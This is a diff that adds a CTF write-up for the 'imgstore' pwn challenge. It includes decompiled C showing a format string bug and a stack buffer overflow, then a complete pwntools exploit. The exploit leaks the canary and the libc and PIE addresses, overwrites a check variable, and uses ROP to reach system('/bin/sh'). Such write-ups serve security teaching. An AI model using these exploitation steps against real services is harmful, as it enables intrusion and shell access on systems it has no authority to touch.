@@ -837,10 +837,321 @@ Flag: ictf{that_is_a_lot_of_equations_n2u1iye21azl21}
 I'm getting tired of making this writeup so i'll make it quick
 
 The attached executable came with it's shared library as to which i patched using `pwninit`
+![image](https://github.com/user-attachments/assets/1300bb0c-4536-4c43-ad60-f0dcb55f5e1f)
+
+All protections are enabled on this binary
+![image](https://github.com/user-attachments/assets/0d8fcbf0-5b79-435a-94cb-c2a6b0b7f7eb)
 
 When you run the program you'd get this
+![image](https://github.com/user-attachments/assets/b6def9e0-d813-4a37-8f3a-f951874ad2a9)
+
+We can:
+- List Books
+- Buy Books
+- Sell Books
+- Exit
+
+Using IDA I decompiled the binary and here's the main function
+![image](https://github.com/user-attachments/assets/8b1632cd-2c72-460f-a4d5-aef33f7c4f9e)
+
+Since the binary is stripped we don't have function names 
+
+So when I was solving it I had to first reverse it and rename some variables
+
+But I'll go straight to the point here
+
+In function `sub_208B` is the portion that handles the program logic
+![image](https://github.com/user-attachments/assets/d65265ed-a03d-47ae-9c43-86ee621eb634)
+
+```c
+unsigned __int64 sub_208B()
+{
+  int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  do
+  {
+    puts(" +=======================+");
+    puts(" |                       |");
+    puts(" |     IMG BOOKSTORE     |");
+    puts(" |                       |");
+    puts(" +=-=-=-=-=-=-=-=-=-=-=-=+");
+    puts(" |                       |");
+    puts(" | [1]. List Books.      |");
+    puts(" | [2]. Buy Book.        |");
+    puts(" | [3]. Sell Book.       |");
+    puts(" | [4]. Exit.            |");
+    puts(" |                       |");
+    puts(" +=======================+");
+    puts(&s);
+    printf(">> ");
+    __isoc99_scanf("%1d", &v1);
+    getchar();
+    if ( v1 == 4 )
+    {
+      puts(&s);
+      printf("%s[-] Exiting program..%s\n", "\x1B[31m", "\x1B[0m");
+      sleep(1u);
+      exit(0);
+    }
+    if ( v1 <= 4 )
+    {
+      switch ( v1 )
+      {
+        case 3:
+          sub_1E2A();
+          continue;
+        case 1:
+          sub_19D2();
+          continue;
+        case 2:
+          sub_1F9A();
+          continue;
+      }
+    }
+    printf("%s[/] Invalid option..%s\n", "\x1B[33m", "\x1B[0m");
+    puts(&s);
+  }
+  while ( v1 != 3 );
+  return __readfsqword(0x28u) ^ v2;
+}
+```
+
+From the choices we can pick from the menu the only function that has the bug is option 3 which is "Buy Books" 
+
+When we check the decompilation on function `sub_1E2A` we get this
+![image](https://github.com/user-attachments/assets/caa3f046-a495-477b-b4c6-e4990b642353)
+
+I'll just rename this portion since it's where the first vulnerability resides
+
+```
+unsigned __int64 buy_book()
+{
+  char v1; // [rsp+7h] [rbp-59h] BYREF
+  int buf; // [rsp+8h] [rbp-58h] BYREF
+  int fd; // [rsp+Ch] [rbp-54h]
+  char title[72]; // [rsp+10h] [rbp-50h] BYREF
+  unsigned __int64 v5; // [rsp+58h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  fd = open("/dev/urandom", 0);
+  read(fd, &buf, 4uLL);
+  close(fd);
+  buf = (unsigned __int16)buf;
+  do
+  {
+    printf("Enter book title: ");
+    fgets(title, 50, stdin);
+    printf("Book title --> ");
+    printf(title);
+    puts(&s);
+    if ( 334873123 * buf == dword_6050 )
+    {
+      dword_608C = 2;
+      sub_1D77(2LL);
+    }
+    puts("Sorry, we already have the same title as yours in our database; give me another book title.");
+    printf("Still interested in selling your book? [y/n]: ");
+    __isoc99_scanf("%1c", &v1);
+    getchar();
+  }
+  while ( v1 == 121 );
+  puts(&s);
+  printf("%s[-] Exiting program..%s\n", "\x1B[31m", "\x1B[0m");
+  sleep(1u);
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+
+Here's what it does:
+- Reads 4 random bytes from `/dev/urandom`
+- Gets the 2 bytes from the random byte read in and store it in `buf`
+- While our input is `y` it would do this:
+    - Reads 50 bytes from stdin and store in `title`
+    - Prints the value stored in `title`
+    - Does a comparism against a 4 bytes value with `buf * 334873123`
+    - If the comparism returns True it will call function `sub_1D77` passing 2 as the parameter
+    - Else it would return
+ 
+
+Now the bug here is this:
+
+```
+printf(title)
+```
+
+It is printing our input without specifying a format which leads to a `Format String Bug`
+
+But now let's see what can we use this for?
+
+Looking through we see that it does a comparism against a calculated value with a hardcoded value
+
+That hardcoded value stored in `dword_6050` is `0xFEEDBEEF`
+![image](https://github.com/user-attachments/assets/67f23ec8-653e-4687-bda9-21d6092b922f)
+
+Why is that even important?
+
+Well if the comparism happens to return it would call function `sub_1D77`
+
+Let us see what that does
+![image](https://github.com/user-attachments/assets/41eafae6-be09-435e-9d54-134fdee0d38e)
+
+```c
+unsigned __int64 __fastcall sub_1D77(int a1)
+{
+  char s[104]; // [rsp+10h] [rbp-70h] BYREF
+  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  sub_18F2();
+  if ( a1 == 2 )
+  {
+    printf("%s[/] UNDER DEVELOPMENT %s\n", "\x1B[44m", "\x1B[0m");
+    putchar(62);
+    fgets(s, 160, stdin);
+  }
+  else
+  {
+    printf("%s[!] SECURITY BREACH DETECTED%s\n", "\x1B[41m", "\x1B[0m");
+    puts("[+] BAD HACKER!!");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+Basically this is a function that would receive our input is the parameter passed into it is `2`
+
+And it's vulnerable to buffer overflow at this place:
+
+```c
+char s[104];
+fgets(s, 160, stdin);
+```
+
+Because it's reading in at most 160 bytes into a buffer that can only hold up 104 bytes of data
+
+With this what should we do?
+
+This is how my exploit plan goes:
+- Leak the random 2 bytes, pie address, libc address and canary on the stack
+- Perform the multiplication and overwrite `dword_6050` to the expected value using format string write 
+- Exploit the buffer overflow to call `system('/bin/sh')`
+
+I won't go through how i got those leaks because i'm tired and i've done that multiple times in my writeups
+
+So i'll just show you my exploit
+
+Here's my solve [script]()
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('imgstore_patched')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+libc = exe.libc
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+breakrva 0x1E6F
+breakrva 0x1ECD 
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+# ** Goal function sell book: sell_book **
+# - leak the rand buf generated from /dev/urandom + canary + libc
+# - overwrite the global variable to match (rand_buf * 334873123)
+# - overflow to one_gadget
 
 
+def init():
+    global io
+
+    io = start()
+
+
+def solve():
+
+    leak = "%6$p.%7$p.%13$p.%17$p"
+    io.recvuntil(">>")
+    io.sendline("3")
+    io.sendline(leak)
+
+    io.recvuntil("title --> ")
+    leaked = io.recvline().split(b'.')
+    exe.address = int(leaked[0], 16) - 0x6060
+    rand_buf = int(leaked[1], 16) & 0xffff
+    libc.address = int(leaked[2], 16) - 0x8459a
+    canary = int(leaked[3], 16)
+    
+    info("rand_buf: %#x", rand_buf)
+    info("canary: %#x", canary)
+    info("libc base: %#x", libc.address)
+    info("elf base: %#x", exe.address)
+
+    offset = 8
+    write_val = (0x13F5C223 * rand_buf) & 0xffffffff
+    check = exe.address + 0x6050
+    
+    info("write -> %#x what -> %#x", check, write_val)
+
+    write = {
+        check: write_val
+    }
+
+    payload = fmtstr_payload(offset, write, write_size='short')
+
+    io.sendline('y')
+    io.sendline(payload)
+
+    offset = 104
+    pop_rdi = exe.address + 0x02313 # pop rdi; ret;
+    sh = next(libc.search(b'/bin/sh')) # /bin/sh
+    ret = exe.address + 0x101a # ret;
+    system = libc.sym['system']
+
+    payload = flat({
+        offset: [
+            canary,
+            b'A'*8,
+            pop_rdi,
+            sh,
+            ret,
+            system
+        ]
+    })
+
+    io.sendline(payload)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+```
 
 
 
